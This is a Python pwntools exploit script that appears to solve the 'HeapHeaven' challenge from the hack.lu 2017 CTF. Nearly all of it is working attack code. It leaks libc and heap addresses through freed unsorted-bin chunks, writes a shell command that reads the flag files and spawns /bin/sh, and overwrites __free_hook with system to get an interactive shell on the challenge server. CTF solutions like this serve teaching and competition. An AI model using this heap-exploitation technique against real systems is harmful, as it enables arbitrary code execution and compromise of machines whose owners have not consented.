from pwn import *
context.update(arch='amd64')

cwd = '/media/SSD2/dev/hx/ctf/hacklu17/heapheaven'
bin_ = os.path.join(cwd, 'HeapHeaven')
b = ELF(bin_)
libc = ELF(os.path.join('/lib/x86_64-linux-gnu/libc.so.6'))

# TARGET = 'gdb'
TARGET = 'live'

execute = []
execute.append('continue')
execute = flat(map(lambda x: x + '\n', execute))


def conn():
    if TARGET == 'gdb':
        env = os.environ.copy()
        r = process(bin_, aslr=True)
        gdb.attach(r, gdbscript=execute)
    elif TARGET == 'rr':
        def replay():
            pwnlib.util.misc.run_in_new_terminal('rr replay')
        r = process('rr record ' + bin_, shell=True)
        atexit.register(replay)
    elif TARGET == 'qira':
        # Start withsho
        # stdbuf -oO qira -s ./books_757b0a24b0193ec8989290ec6923dd1d
        r = remote('127.0.0.1', 4000)
    elif TARGET == 'naked':
        r = remote('localhost', 24242)
    else:
        r = remote('flatearth.fluxfingers.net', 1743)

    return r


def unparse_num(n):
    return bin(n)[2:].zfill(64).replace("0", "wa").replace("1", "wi")


def whaa(size):
    print p.sendlineafter('-NOM', 'whaa!')
    p.sendline(unparse_num(size))


def nom_nom(offset):
    print p.sendlineafter('-NOM', 'NOM-NOM')
    p.sendline(unparse_num(offset))


def mommy(offset):
    print p.sendlineafter('-NOM', 'mommy?')
    p.sendline(unparse_num(offset))
    p.recvline()
    return p.recvline()[:-1].split('darling: ')[1]


def spill(offset, stuff):
    print p.sendlineafter('-NOM', '<spill>')
    p.sendline(unparse_num(offset))
    p.sendline(stuff)


p = conn()
whaa(0x100)
whaa(0)
whaa(0x100)
whaa(0)
# free the next chunk to create unsortted bin ptrs
nom_nom(32)
nom_nom(32 + 272 + 32)

# leak it
leak = mommy(32)
leak = u64(leak.ljust(8, '\x00'))
libc_base = leak - 0x3c4b78
leak2 = mommy(32 + 8)
leak2 = u64(leak2.ljust(8, '\x00'))
heap_base = leak2 - 0x150


print 'leak: ', hex(leak), 'libc_base: ', hex(libc_base), 'heap_base: ', hex(heap_base)
libc.address = libc_base

spill(0x40, 'echo OK GOOGLE; cat fl*; cat */*/fl*; /bin/sh\0')
print 'write target: ', hex(libc.symbols['__free_hook']), 'offset: ', hex(libc.symbols['__free_hook'] - (heap_base + 0x50))
spill(libc.symbols['__free_hook'] - (heap_base + 0x10), p64(libc.symbols['system']))
pause()
nom_nom(0x40)
p.interactive()